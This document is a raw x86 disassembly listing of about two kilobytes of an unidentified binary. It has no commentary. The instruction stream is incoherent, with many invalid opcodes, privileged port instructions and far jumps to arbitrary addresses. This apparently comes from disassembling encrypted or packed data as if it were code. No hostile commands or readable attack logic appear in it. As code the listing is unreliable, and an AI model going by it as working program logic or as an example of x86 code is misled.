  4070b1:	out    dx,eax
  4070b2:	gs loope 0x40710c
  4070b5:	pop    ebx
  4070b6:	inc    esp
  4070b7:	lods   eax,DWORD PTR ds:[esi]
  4070b8:	inc    BYTE PTR [eax]
  4070ba:	xor    ebx,DWORD PTR [ecx+0x67255424]
  4070c0:	retf   0xa190
  4070c3:	add    eax,0xc1eecaea
  4070c8:	inc    ebx
  4070c9:	inc    DWORD PTR [esi-0x11]
  4070cc:	(bad)  
  4070cd:	repz dec ecx
  4070cf:	dec    ebx
  4070d0:	mov    ecx,0x13846834
  4070d5:	lock je 0x4070f5
  4070d8:	jbe    0x4070e4
  4070da:	adc    esi,DWORD PTR [esi-0x41584503]
  4070e0:	push   edx
  4070e1:	pop    esi
  4070e2:	(bad)
  4070e6:	sub    BYTE PTR [eax-0x6cc67e27],ah
  4070ec:	out    dx,al
  4070ed:	test   al,0xc1
  4070ef:	pusha  
  4070f0:	rcr    eax,1
  4070f2:	retf   0x2adf
  4070f5:	pop    ecx
  4070f6:	cmp    edi,ecx
  4070f8:	pop    ds
  4070f9:	or     al,0x9a
  4070fb:	in     al,0x88
  4070fd:	imul   edi,edi,0x7a
  407100:	pop    esi
  407101:	sysexit 
  407103:	inc    ecx
  407104:	mov    ch,0x75
  407106:	xor    DWORD PTR [esp+ebx*8-0x25],edx
  40710a:	ja     0x407185
  40710c:	push   ebp
  40710d:	push   edi
  40710e:	scas   eax,DWORD PTR es:[edi]
  40710f:	sub    eax,0x27afaae1
  407114:	sbb    al,0xe0
  407116:	or     DWORD PTR ds:0x1cf6664,ecx
  40711c:	das    
  40711d:	mov    bh,0x3
  40711f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407120:	pushf  
  407121:	mov    ds:0x6919ef74,al
  407126:	inc    edx
  407127:	or     ch,BYTE PTR [ebx+0x2740f244]
  40712d:	inc    ebp
  40712e:	mov    ebx,0xc8841242
  407133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407134:	add    ah,BYTE PTR ds:[ecx-0x6181a66b]
  40713b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40713c:	loop   0x4070f8
  40713e:	and    esp,DWORD PTR [ebx+0x571a391]
  407144:	dec    esp
  407145:	jno    0x4070d1
  407147:	fidiv  DWORD PTR [esi+0x65]
  40714a:	push   edx
  40714b:	sub    bh,BYTE PTR [ebp-0x3b]
  40714e:	cmp    bl,0xe0
  407151:	jmp    0x87e42c08
  407156:	arpl   WORD PTR [esi],sp
  407158:	sub    cl,BYTE PTR [eax+0x4c]
  40715b:	nop
  40715c:	dec    esp
  40715d:	call   0x32d1:0xa4d3d529
  407164:	push   edx
  407165:	inc    edx
  407166:	sub    eax,0x16d7eb4e
  40716b:	inc    ecx
  40716c:	aad    0x72
  40716e:	stc    
  40716f:	jno    0x407135
  407171:	addr16 jae 0x407134
  407174:	out    dx,al
  407175:	mov    ecx,0xe7f8734e
  40717a:	(bad)  
  40717b:	lds    ecx,FWORD PTR [edx+0x678ec975]
  407181:	loopne 0x4071e7
  407183:	xchg   esp,eax
  407184:	xchg   edx,edx
  407186:	or     bl,0x14
  407189:	pop    edx
  40718a:	aas    
  40718b:	imul   ebp,DWORD PTR [ebp-0x64],0xd2750b64
  407192:	call   0x1406d67c
  407197:	jle    0x40716f
  407199:	dec    eax
  40719a:	loop   0x4071cf
  40719c:	cld    
  40719d:	fidiv  WORD PTR [ecx-0x427bb2ce]
  4071a3:	and    BYTE PTR [ebx-0x66],ah
  4071a6:	cwde   
  4071a7:	jge    0x407163
  4071a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071aa:	(bad)  
  4071ab:	out    dx,eax
  4071ac:	sbb    edx,ebx
  4071ae:	imul   ebp,DWORD PTR [esi],0xffffffdf
  4071b1:	fcomp  QWORD PTR [esi]
  4071b3:	sbb    ecx,DWORD PTR [ebx+0x35]
  4071b6:	xor    dl,BYTE PTR [esp+ecx*1-0x4b]
  4071ba:	aam    0xb8
  4071bc:	ins    DWORD PTR es:[edi],dx
  4071bd:	je     0x40716e
  4071bf:	dec    edi
  4071c0:	imul   ecx,DWORD PTR [ecx+0x1b],0xb3a6d9e8
  4071c7:	cli    
  4071c8:	adc    bl,BYTE PTR [ebx+0x74bfc5ce]
  4071ce:	ret    
  4071cf:	xchg   esp,eax
  4071d0:	adc    ebx,DWORD PTR [ebp-0xe]
  4071d3:	addr16 (bad) 
  4071d5:	repz test al,0x78
  4071d8:	jae    0x407186
  4071da:	aas    
  4071db:	inc    esi
  4071dc:	call   0x9e33:0x9b0c2a3
  4071e3:	es mov esp,0xb686c296
  4071e9:	xor    DWORD PTR ds:0xf9303516,edi
  4071ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f0:	lods   eax,DWORD PTR ds:[esi]
  4071f1:	pop    eax
  4071f2:	mov    eax,ds:0xe2fb37ff
  4071f7:	and    edi,DWORD PTR [ebx-0x11]
  4071fa:	out    0x93,al
  4071fc:	sahf   
  4071fd:	pop    edx
  4071fe:	cmp    eax,0x9d592c97
  407203:	aas    
  407204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407205:	fisub  DWORD PTR [edi+0x35]
  407208:	jmp    0x48b1:0x9afd722
  40720f:	inc    ebp
  407210:	add    edx,DWORD PTR [edi]
  407212:	pop    ss
  407213:	mov    bh,BYTE PTR [eax]
  407215:	jmp    0x834:0xcf7c28a1
  40721c:	push   es
  40721d:	mov    ebp,0xd1230fba
  407222:	pop    ebx
  407223:	xchg   esi,eax
  407224:	dec    eax
  407225:	xor    eax,0x64f96fda
  40722a:	push   0xa5fee884
  40722f:	mov    bl,BYTE PTR ds:0x59cf88ec
  407235:	jo     0x4071f4
  407237:	(bad)  
  407238:	jmp    0x88e2479a
  40723d:	push   edx
  40723e:	dec    ebp
  40723f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407240:	mov    ?,eax
  407242:	sbb    BYTE PTR [edx-0x4462991f],dh
  407248:	int3   
  407249:	sub    al,0xba
  40724b:	(bad)  
  40724c:	leave  
  40724d:	pop    eax
  40724e:	fild   DWORD PTR [eax+0x59]
  407251:	jmp    0xb921:0xa774b947
  407258:	cmp    BYTE PTR [ebp+0x4e],bl
  40725b:	push   edx
  40725c:	sub    DWORD PTR ds:0xb33e514,esp
  407262:	pop    esi
  407263:	loope  0x407296
  407265:	xchg   ebp,eax
  407266:	cli    
  407267:	xchg   ecx,eax
  407268:	jmp    DWORD PTR [eax]
  40726a:	or     DWORD PTR [ecx-0x33884fe],0xffffffa1
  407271:	test   al,0xb1
  407273:	sbb    DWORD PTR [edi+edi*1-0x5b06eb56],ebp
  40727a:	(bad)  
  40727b:	jnp    0x407250
  40727d:	retf   0xfa1f
  407280:	mov    dh,0x8c
  407282:	scas   eax,DWORD PTR es:[edi]
  407283:	push   ebp
  407284:	xchg   edi,eax
  407285:	mov    ds:0xb3e74e1e,al
  40728a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728b:	es jno 0x407278
  40728e:	pop    edi
  40728f:	or     edi,DWORD PTR [eax]
  407291:	or     bh,BYTE PTR [edx+0x64]
  407294:	retf   0xcba6
  407297:	pop    ebp
  407298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407299:	jmp    0x92d8a4a0
  40729e:	and    eax,0xb52b460d
  4072a3:	adc    ch,BYTE PTR [eax-0x59]
  4072a6:	sub    ah,0x2f
  4072a9:	pop    ss
  4072aa:	lahf   
  4072ab:	mov    esi,0x4aa4f718
  4072b0:	stos   DWORD PTR es:[edi],eax
  4072b1:	xchg   edi,eax
  4072b2:	mov    gs,WORD PTR [esp+eiz*2]
  4072b5:	mov    dh,0xc6
  4072b7:	out    dx,al
  4072b8:	rol    eax,0x5
  4072bb:	fistp  QWORD PTR [esi+esi*8-0x5c0f31f9]
  4072c2:	push   edi
  4072c3:	push   ecx
  4072c4:	inc    ecx
  4072c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c7:	loop   0x40727d
  4072c9:	lock push edx
  4072cb:	fsubr  QWORD PTR [eax+0x3b25c61f]
  4072d1:	jle    0x4072af
  4072d3:	pop    eax
  4072d4:	out    0x8a,eax
  4072d6:	inc    edx
  4072d7:	and    edx,DWORD PTR [edi]
  4072d9:	sbb    al,0xe8
  4072dc:	aaa    
  4072dd:	outs   dx,BYTE PTR ds:[esi]
  4072de:	es jae 0x4072c9
  4072e1:	inc    eax
  4072e2:	push   ebp
  4072e3:	in     al,dx
  4072e4:	and    ecx,esi
  4072e6:	lahf   
  4072e7:	mov    ebp,0xc606fe1
  4072ec:	int    0xa9
  4072ee:	cmp    eax,0xfdc73148
  4072f3:	sbb    BYTE PTR [edx-0x7b],bh
  4072f6:	fnsave [ebp-0x1532c1cc]
  4072fc:	call   DWORD PTR [ecx+0x7c90448f]
  407302:	mov    eax,0xb1e20542
  407307:	and    ebx,eax
  407309:	(bad)  
  40730a:	(bad)  
  40730b:	pushf  
  40730c:	push   edi
  40730d:	mov    ch,0x71
  40730f:	and    DWORD PTR [ecx-0x715d6d09],edx
  407315:	lds    ebx,FWORD PTR [eax-0x54]
  407318:	imul   edi,DWORD PTR [ebx],0x62
  40731b:	cmp    ax,WORD PTR [esi+0x56c6efdd]
  407322:	lods   al,BYTE PTR ds:[esi]
  407323:	loop   0x40730a
  407325:	jg     0x407330
  407327:	or     dl,dh
  407329:	jecxz  0x407380
  40732b:	sbb    BYTE PTR [esi+0x46],ah
  40732e:	mov    ds:0x900ea8bf,al
  407333:	jns    0x407365
  407335:	(bad)  
  407336:	shr    BYTE PTR [eax],0xa4
  407339:	dec    ebx
  40733a:	lahf   
  40733b:	rol    DWORD PTR [ebp+0x59f35877],cl
  407341:	add    eax,0x9ca10dbe
  407346:	(bad)  
  407347:	dec    ebp
  407348:	shr    BYTE PTR [edi+0xf],1
  40734b:	adc    esi,DWORD PTR [edx+ecx*1+0x11aa2d6f]
  407352:	jbe    0x4073a7
  407354:	popa   
  407355:	sti    
  407356:	leave  
  407357:	cs inc eax
  407359:	fwait
  40735a:	mov    esi,0x71a61254
  40735f:	mov    ds:0x3383d610,al
  407364:	mov    ch,BYTE PTR [ebx]
  407366:	jno    0x407361
  407368:	xchg   DWORD PTR [ebx],ebp
  40736a:	xchg   esp,eax
  40736b:	mov    bh,0x6b
  40736d:	hlt    
  40736e:	jno    0x4073df
  407370:	(bad)  
  407371:	mov    ds:0xd9010488,al
  407376:	daa    
  407377:	push   0x1a
  407379:	mov    esi,0xb962c9c5
  40737e:	push   0x51c9021d
  407383:	cmp    BYTE PTR [ecx-0x440e545a],0x7d
  40738a:	cmp    BYTE PTR [ebx],ch
  40738c:	imul   esp,edx,0xffffff81
  40738f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407390:	sti    
  407391:	xchg   edi,eax
  407392:	fistp  DWORD PTR [edx-0x6]
  407395:	outs   dx,BYTE PTR ds:[esi]
  407396:	pop    esp
  407397:	das    
  407398:	pop    ebp
  407399:	or     eax,0xd51b580f
  40739e:	loopne 0x40735d
  4073a0:	out    0x63,eax
  4073a2:	sub    al,0xdb
  4073a4:	in     eax,0x1a
  4073a6:	fmul   DWORD PTR [edx+0x3c]
  4073a9:	ftst   
  4073ab:	push   ebp
  4073ac:	dec    edi
  4073ad:	adc    eax,edx
  4073af:	inc    edi
  4073b0:	push   ecx
  4073b1:	stos   DWORD PTR es:[edi],eax
  4073b2:	mov    ds:0xb747f719,eax
  4073b7:	jno    0x407368
  4073b9:	(bad)  
  4073ba:	cli    
  4073bb:	adc    eax,0xca455c2b
  4073c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c1:	mov    eax,ds:0x285b179c
  4073c6:	xchg   ebp,eax
  4073c7:	xchg   esi,eax
  4073c8:	mov    BYTE PTR ds:0xa3bbd884,bh
  4073ce:	push   edx
  4073cf:	or     eax,0xf462cb00
  4073d4:	sub    DWORD PTR [edi-0x23c70e58],esi
  4073da:	or     eax,0xd8806e34
  4073df:	cli    
  4073e0:	cmp    bh,dh
  4073e2:	cmp    eax,0xbcf3234e
  4073e7:	jp     0x40740e
  4073e9:	inc    eax
  4073ea:	sbb    bh,BYTE PTR [edx]
  4073ec:	fstp   TBYTE PTR [ebx-0x4aca37aa]
  4073f2:	mov    BYTE PTR [eax+0x3ff09c80],bh
  4073f8:	mov    ds:0xd948af0c,eax
  4073fd:	ins    BYTE PTR es:[edi],dx
  4073fe:	xlat   BYTE PTR ds:[ebx]
  4073ff:	mov    BYTE PTR [edx],dh
  407401:	loop   0x40747d
  407403:	ss repz ret 
  407406:	sbb    al,0x54
  407408:	lock mov eax,ds:0x342ea989
  40740e:	fisttp QWORD PTR [eax-0x27]
  407411:	sub    ebx,0xffffffcb
  407414:	outs   dx,BYTE PTR ds:[esi]
  407415:	mov    ds:0xeeff562e,eax
  40741a:	hlt    
  40741b:	dec    edx
  40741c:	das    
  40741d:	in     eax,0x90
  40741f:	cld    
  407420:	clc    
  407421:	enter  0xe344,0xb0
  407425:	dec    eax
  407426:	xchg   esp,eax
  407427:	ds cld 
  407429:	pop    ebp
  40742a:	and    eax,0x5ac69a62
  40742f:	ficom  WORD PTR [ecx-0x7cffb973]
  407435:	mov    ebp,?
  407437:	or     al,0xab
  407439:	jg     0x40743d
  40743b:	cmp    esi,edx
  40743d:	mov    ebp,0x932a2684
  407442:	jecxz  0x407406
  407444:	ins    DWORD PTR es:[edi],dx
  407445:	or     eax,0x95daa178
  40744a:	imul   ebp,DWORD PTR [ebx-0xb],0x49
  40744e:	mov    eax,0x72bd3283
  407453:	or     cl,BYTE PTR [esi]
  407455:	cdq    
  407456:	loope  0x40740b
  407458:	inc    eax
  407459:	mov    bl,0x36
  40745b:	fnstenv [esi-0x7]
  40745e:	sbb    al,0xf4
  407460:	ins    DWORD PTR es:[edi],dx
  407461:	push   edx
  407462:	or     al,0x43
  407464:	shl    eax,cl
  407466:	xlat   BYTE PTR ds:[ebx]
  407467:	mov    cl,0x4e
  407469:	in     eax,0x93
  40746b:	repz cwde 
  40746d:	iret   
  40746e:	aas    
  40746f:	in     eax,0x29
  407471:	out    dx,al
  407472:	push   ecx
  407473:	jecxz  0x407459
  407475:	pop    ebp
  407476:	test   BYTE PTR [edx],ah
  407478:	inc    ebp
  407479:	aaa    
  40747a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40747b:	outs   dx,BYTE PTR ds:[esi]
  40747c:	adc    ebp,DWORD PTR [esi-0x4a16404d]
  407482:	and    esp,DWORD PTR [ebp+0x6b474889]
  407488:	push   ds
  407489:	mov    ch,0x98
  40748b:	jmp    FWORD PTR [eax]
  40748d:	sub    DWORD PTR [eax+0x76ab4e98],esi
  407493:	fs nop
  407495:	imul   ebp,DWORD PTR [ebx-0x2f],0xffffff9c
  407499:	mov    al,0x9
  40749b:	fsubr  DWORD PTR [ecx]
  40749d:	data16 scas al,BYTE PTR es:[edi]
  40749f:	jle    0x4074a4
  4074a1:	lds    eax,FWORD PTR [esp+ebx*2]
  4074a4:	dec    ecx
  4074a5:	pop    esi
  4074a6:	mov    esp,es
  4074a8:	mov    edi,ebp
  4074aa:	aas    
  4074ab:	xor    BYTE PTR [eax+0x702e4db8],dl
  4074b1:	mov    bh,0x1e
  4074b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b4:	xchg   ecx,eax
  4074b5:	outs   dx,DWORD PTR ds:[esi]
  4074b6:	mov    ebp,0x12def348
  4074bb:	aam    0x31
  4074bd:	(bad)  [esi]
  4074bf:	mov    ?,WORD PTR [edx]
  4074c1:	adc    DWORD PTR [eax-0x69],ecx
  4074c4:	in     al,0xbb
  4074c6:	loop   0x4074ec
  4074c8:	mov    cl,0xb8
  4074ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074cb:	mov    bh,0xf1
  4074cd:	mov    WORD PTR [ecx-0x10e7f7c5],gs
  4074d3:	sbb    dh,BYTE PTR [esi]
  4074d5:	in     eax,dx
  4074d6:	xor    DWORD PTR [esi],0x54a634cd
  4074dc:	ja     0x4074bc
  4074de:	xchg   ebx,eax
  4074df:	js     0x4074bb
  4074e1:	sbb    DWORD PTR [eax+0x1511aa8b],ecx
  4074e7:	push   esp
  4074e8:	mov    BYTE PTR [ecx-0x28c72fa3],bl
  4074ee:	je     0x407493
  4074f0:	sub    eax,0x4d5bbd5d
  4074f5:	push   ebx
  4074f6:	loope  0x4074ed
  4074f8:	cdq    
  4074f9:	mov    ds:0x90ac28a2,al
  4074fe:	adc    bh,BYTE PTR [ecx+0x5de0fa39]
  407504:	sub    BYTE PTR [ecx-0x5a],ch
  407507:	loopne 0x407511
  407509:	inc    eax
  40750a:	mov    bh,0x5a
  40750c:	pop    eax
  40750d:	or     ebx,ecx
  40750f:	xchg   ecx,eax
  407510:	inc    edi
  407511:	cmp    DWORD PTR [eax],ecx
  407513:	test   al,0x81
  407515:	adc    bh,BYTE PTR [eax]
  407517:	hlt    
  407518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407519:	repz add al,0x14
  40751c:	and    al,0x7e
  40751e:	repz xor bl,bl
  407521:	xchg   edi,eax
  407522:	fwait
  407523:	sub    al,0xf7
  407525:	fstp   QWORD PTR [ebx+0x6559307d]
  40752b:	ret    0x516f
  40752e:	and    ch,BYTE PTR [edi-0xe]
  407531:	pop    ss
  407532:	inc    ebp
  407533:	jnp    0x40751b
  407535:	sub    dh,BYTE PTR fs:[ecx+ebp*2+0x31]
  40753a:	dec    esi
  40753b:	retf   
  40753c:	dec    ecx
  40753d:	out    dx,eax
  40753e:	mov    WORD PTR [eax-0x27],?
  407541:	clc    
  407542:	bnd jno 0x40759b
  407545:	xchg   ebx,eax
  407546:	jl     0x407545
  407548:	ret    
  407549:	in     al,dx
  40754a:	icebp  
  40754b:	jmp    0x4074fa
  40754d:	arpl   WORD PTR [ecx-0x9],di
  407550:	sub    al,0xe0
  407552:	popa   
  407553:	fnstenv [edi-0x15]
  407556:	inc    esp
  407557:	stos   DWORD PTR es:[edi],eax
  407558:	jmp    0x7f99:0xb67e3cba
  40755f:	mov    gs,WORD PTR [esi-0x3ce3e5bc]
  407565:	cmp    DWORD PTR [edi-0x82cfc51],ebp
  40756b:	add    eax,DWORD PTR [ebx-0x80]
  40756e:	pop    edx
  40756f:	pop    esp
  407570:	jl     0x407517
  407572:	mov    cl,ah
  407574:	loopne 0x40750e
  407576:	add    eax,0x120a3d46
  40757b:	test   DWORD PTR [ebp+esi*8+0x600fb1e7],0xea6323ca
  407586:	sbb    dl,cl
  407588:	fisttp DWORD PTR [esp+edx*2]
  40758b:	(bad)  
  40758d:	mov    eax,ds:0x1df3e0a3
  407592:	xor    ah,BYTE PTR ds:0x42d81644
  407598:	and    al,0x4e
  40759a:	pushf  
  40759b:	fadd   DWORD PTR [eax]
  40759d:	cmp    eax,0x2bcc9441
  4075a2:	sbb    al,0x3a
  4075a4:	leave  
  4075a5:	jle    0x4075eb
  4075a7:	jmp    0x202b:0x683c1d33
  4075ae:	adc    edi,DWORD PTR [ebx+0x41006107]
  4075b4:	xor    cl,ch
  4075b6:	sbb    al,0x26
  4075b8:	rcl    DWORD PTR [eax-0x70],cl
  4075bb:	imul   ecx,DWORD PTR [eax+0x7cd9da73]
  4075c2:	cvtps2pi mm7,QWORD PTR [ebx+0x54]
  4075c6:	sti    
  4075c7:	push   eax
  4075c8:	jle    0x407577
  4075ca:	(bad)  
  4075cb:	imul   esp,DWORD PTR [edi+0x38f4aa02],0xaa68ff17
  4075d5:	push   esi
  4075d6:	(bad)  
  4075d8:	addr16 mov al,0x57
  4075db:	fcmovnu st,st(7)
  4075dd:	sub    DWORD PTR [ebx],ecx
  4075df:	xchg   edx,eax
  4075e0:	jns    0x407607
  4075e2:	xchg   ebp,eax
  4075e3:	push   es
  4075e4:	test   edi,ebp
  4075e6:	fmul   QWORD PTR [ebx+ebx*2+0x6d]
  4075ea:	sbb    al,0x4b
  4075ec:	jbe    0x4075ed
  4075ee:	pop    edi
  4075ef:	test   eax,0xb6c97dbe
  4075f4:	pop    esp
  4075f5:	loopne 0x4075ef
  4075f7:	cwde   
  4075f8:	test   BYTE PTR [eax-0x7d39c022],ch
  4075fe:	not    BYTE PTR [ebp+eax*2-0x2]
  407602:	pop    edi
  407603:	adc    BYTE PTR [ebp-0x5bbfca0a],dl
  407609:	iret   
  40760a:	retf   
  40760b:	push   ebx
  40760c:	clc    
  40760d:	push   edx
  40760e:	shr    BYTE PTR [ebx+0x202de1bb],cl
  407614:	test   edx,esp
  407616:	inc    ecx
  407617:	cmp    al,0x3f
  407619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40761a:	int3   
  40761b:	inc    esp
  40761c:	lea    ebx,[ebx+0x18b0ebbd]
  407622:	jg     0x40768e
  407624:	std    
  407625:	mov    edx,esp
  407627:	mov    bh,al
  407629:	out    0x59,eax
  40762b:	xor    al,0x81
  40762d:	test   eax,0xa79a350c
  407632:	sub    al,0x7b
  407634:	dec    ecx
  407635:	ss or  al,0x6c
  407638:	jae    0x4075da
  40763a:	test   DWORD PTR [esi-0x6e],edx
  40763d:	push   cs
  40763e:	and    ebx,DWORD PTR [ecx+0x6bb02549]
  407644:	pop    esp
  407645:	xchg   DWORD PTR [ebp+ebx*8+0x5f],edi
  407649:	mov    dl,0xf9
  40764b:	in     al,dx
  40764c:	out    dx,al
  40764d:	js     0x407679
  40764f:	or     DWORD PTR [edi],ebx
  407651:	push   0xa8534886
  407656:	sti    
  407657:	ins    BYTE PTR es:[edi],dx
  407658:	dec    ebx
  407659:	sub    ebp,DWORD PTR [edi+eiz*4-0xc720c1b]
  407660:	clc    
  407661:	cwde   
  407662:	in     al,dx
  407663:	mov    al,0x19
  407665:	inc    ebp
  407666:	dec    esp
  407667:	or     eax,0x33c5b67b
  40766c:	adc    DWORD PTR [ecx],0xffffffea
  40766f:	sub    bl,ah
  407671:	js     0x407652
  407673:	(bad)  
  407674:	popf   
  407675:	sub    BYTE PTR [ebp-0x14],bl
  407678:	test   al,0x10
  40767a:	push   ebp
  40767b:	jne    0x4076f1
  40767d:	pop    ebp
  40767e:	dec    ebp
  40767f:	add    ebx,edx
  407681:	cmp    al,0x7
  407683:	cmp    eax,0x7aba7b05
  407688:	push   esp
  407689:	jbe    0x407639
  40768b:	fadd   DWORD PTR [ecx]
  40768d:	mov    BYTE PTR [esi],al
  40768f:	add    DWORD PTR [ebx+0x2ede831],ecx
  407695:	out    0xfb,al
  407697:	adc    al,0x95
  407699:	in     eax,0xc3
  40769b:	int3   
  40769c:	imul   edi,DWORD PTR [ecx-0x2317fbc9],0x26d3eac1
  4076a6:	imul   ebx,DWORD PTR [esi+0x44285a55],0x1205f8df
  4076b0:	in     eax,0x1d
  4076b2:	cs push ecx
  4076b4:	lgs    esi,FWORD PTR [eax+0x2a]
  4076b8:	dec    ebp
  4076b9:	adc    DWORD PTR [edi-0x69ef8e3],ebx
  4076bf:	icebp  
  4076c0:	out    0xc2,eax
  4076c2:	inc    ebp
  4076c3:	xchg   edi,eax
  4076c4:	pushf  
  4076c5:	and    eax,DWORD PTR [edx]
  4076c7:	(bad)  
  4076c9:	inc    esp
  4076ca:	add    BYTE PTR [eax],dh
  4076cc:	jne    0x407673
  4076ce:	in     al,dx
  4076cf:	or     eax,0x8af8e978
  4076d4:	xchg   edi,eax
  4076d5:	cwde   
  4076d6:	icebp  
  4076d7:	in     eax,0xd6
  4076d9:	mov    al,ds:0x9eda2603
  4076de:	mov    ah,0xbc
  4076e0:	scas   al,BYTE PTR es:[edi]
  4076e1:	or     DWORD PTR [ebx],eax
  4076e3:	sahf   
  4076e4:	jb     0x40769e
  4076e6:	sub    ah,dh
  4076e8:	ins    BYTE PTR es:[edi],dx
  4076e9:	mov    ch,0xcb
  4076eb:	mov    cl,0x85
  4076ed:	inc    bl
  4076ef:	sbb    esi,ebx
  4076f1:	shl    BYTE PTR [ecx-0x50c8c490],cl
  4076f7:	nop
  4076f8:	data16 mov ah,0x7d
  4076fb:	arpl   sp,dx
  4076fd:	test   al,0x34
  4076ff:	jecxz  0x4076af
  407701:	and    al,0x5e
  407703:	aad    0x37
  407705:	jnp    0x40772b
  407707:	dec    ebp
  407708:	test   eax,0xdaab6227
  40770d:	jne    0x4076e6
  40770f:	mov    DWORD PTR [esp+ecx*2],ebx
  407712:	lods   eax,DWORD PTR ds:[esi]
  407713:	js     0x40773c
  407715:	mov    ebx,0xd7159745
  40771a:	scas   eax,DWORD PTR es:[edi]
  40771b:	(bad)  [ecx+0x1d]
  40771e:	pushf  
  40771f:	xchg   ebp,eax
  407720:	jo     0x4076c3
  407722:	mov    esp,0xba8f5af3
  407727:	test   al,bh
  407729:	arpl   WORD PTR [edx-0x3e],sp
  40772c:	paddd  mm6,mm5
  40772f:	pop    esi
  407730:	mov    ds:0x69d190ac,eax
  407735:	xor    DWORD PTR ds:0x49a92153,esp
  40773b:	cli    
  40773c:	dec    eax
  40773d:	dec    ebp
  40773e:	shl    DWORD PTR es:[eax-0x77],0x11
  407743:	scas   al,BYTE PTR es:[edi]
  407744:	pushf  
  407745:	mov    al,0x87
  407747:	ja     0x4076ed
  407749:	and    eax,0xadbd300d
  40774e:	cmp    dh,BYTE PTR [esi-0x29]
  407751:	std    
  407752:	mov    ebx,0xd06d6b0d
  407757:	jne    0x4077b5
  407759:	popa   
  40775a:	cmc    
  40775b:	icebp  
  40775c:	mov    bl,0x7b
  40775e:	imul   edi,DWORD PTR ds:0x918711cb,0x7c
  407765:	gs inc eax
  407767:	pop    es
  407768:	mov    bl,0x9d
  40776a:	inc    eax
  40776b:	mov    ebx,0x2738a7c6
  407770:	mov    al,ds:0x5d0f7872
  407775:	fwait
  407776:	pop    eax
  407777:	jae    0x407792
  407779:	cs jmp 0xf41a:0xe3ff3453
  407781:	mov    ebp,0x40d09aac
  407786:	push   ebx
  407787:	sub    BYTE PTR [edi-0x3861c586],ah
  40778d:	fnstcw WORD PTR [edx+0x60e03100]
  407793:	outs   dx,BYTE PTR ds:[esi]
  407794:	cmp    eax,0xeebc9d8e
  407799:	fbstp  TBYTE PTR [eax]
  40779b:	jge    0x4077c8
  40779d:	std    
  40779e:	call   DWORD PTR [edx+0x44]
  4077a1:	jno    0x407800
  4077a3:	lock jne 0x4077c7
  4077a6:	popa   
  4077a7:	test   BYTE PTR [edx+0x69],bl
  4077aa:	ja     0x407797
  4077ac:	mov    al,0xd7
  4077ae:	pop    edi
  4077af:	lods   al,BYTE PTR ds:[esi]
  4077b0:	scas   eax,DWORD PTR es:[edi]
  4077b1:	popa   
  4077b2:	in     eax,dx
  4077b3:	repz mov al,ds:0xe720bf24
  4077b9:	jo     0x407812
  4077bb:	xchg   ebp,eax
  4077bc:	sti    
  4077bd:	cmp    eax,DWORD PTR ds:0x20ba5565
  4077c3:	jmp    0x83a3:0x581ecf38
  4077ca:	(bad)  
  4077cb:	jmp    0x40783f
  4077cd:	fmul   DWORD PTR [ecx]
  4077cf:	dec    ecx
  4077d0:	xor    dl,BYTE PTR [ebx+0x403091a]
  4077d6:	adc    al,0x46
  4077d8:	xchg   DWORD PTR [esi],edx
  4077da:	fistp  QWORD PTR [esi+0x4b23e3df]
  4077e0:	sbb    BYTE PTR [edi-0x4b],0xc9
  4077e4:	jle    0x407781
  4077e6:	dec    ecx
  4077e7:	pop    ebp
  4077e8:	stos   DWORD PTR es:[edi],eax
  4077e9:	pop    ecx
  4077ea:	inc    ch
  4077ec:	ins    BYTE PTR es:[edi],dx
  4077ed:	adc    eax,0xf64d759c
  4077f2:	jle    0x407835
  4077f4:	iret   
  4077f5:	imul   ecx,edx,0xd49cbd64
  4077fb:	mov    ch,BYTE PTR [ebx-0x75]
  4077fe:	push   0x6ffd8207
  407803:	in     al,dx
  407804:	sbb    BYTE PTR [edi+0x352734b1],0xc8
  40780b:	sbb    dh,BYTE PTR [eax-0x2507acd]
  407811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407812:	stc    
  407813:	gs pop edi
  407815:	pop    esp
  407816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407817:	adc    ah,BYTE PTR [esi+0x10]
  40781a:	mov    ds:0x76515a92,al
  40781f:	sbb    eax,0x111f2cbb
  407824:	jns    0x407897
  407826:	daa    
  407827:	hlt    
  407828:	lds    edx,FWORD PTR [edx]
  40782a:	push   edi
  40782b:	sbb    ebx,edx
  40782d:	sub    cl,BYTE PTR [ebp+0x63a2c6fe]
  407833:	mov    edi,0xf312e9b7
  407838:	nop
  407839:	inc    edx
  40783a:	iret   
  40783b:	retf   
  40783c:	and    edx,esp
  40783e:	pop    esp
  40783f:	ja     0x4077d0
  407841:	lahf   
  407842:	frstorw [eax-0x1cd2b252]
  407849:	gs int3 
  40784b:	mov    bl,0x4
  40784d:	mov    ecx,0x1bee8de2
  407852:	fdiv   QWORD PTR [ebx-0x78]
  407855:	sub    al,0x69
  407857:	test   eax,0xeb5b6c91
  40785c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40785d:	add    eax,0xda65c89e
  407862:	shr    eax,cl
  407864:	out    dx,eax
  407865:	xor    BYTE PTR [edx-0x6],0xd3
  407869:	ret    0xce0f
  40786c:	loope  0x4078dc
  40786e:	shl    WORD PTR [esi],cl
  407871:	mov    eax,0x2ab335cb
  407876:	(bad)  
  407877:	fucomip st,st(7)
  407879:	jge    0x4078ab
  40787b:	jne    0x40788f
  40787d:	lds    esp,FWORD PTR [eax*1-0x5fafc434]
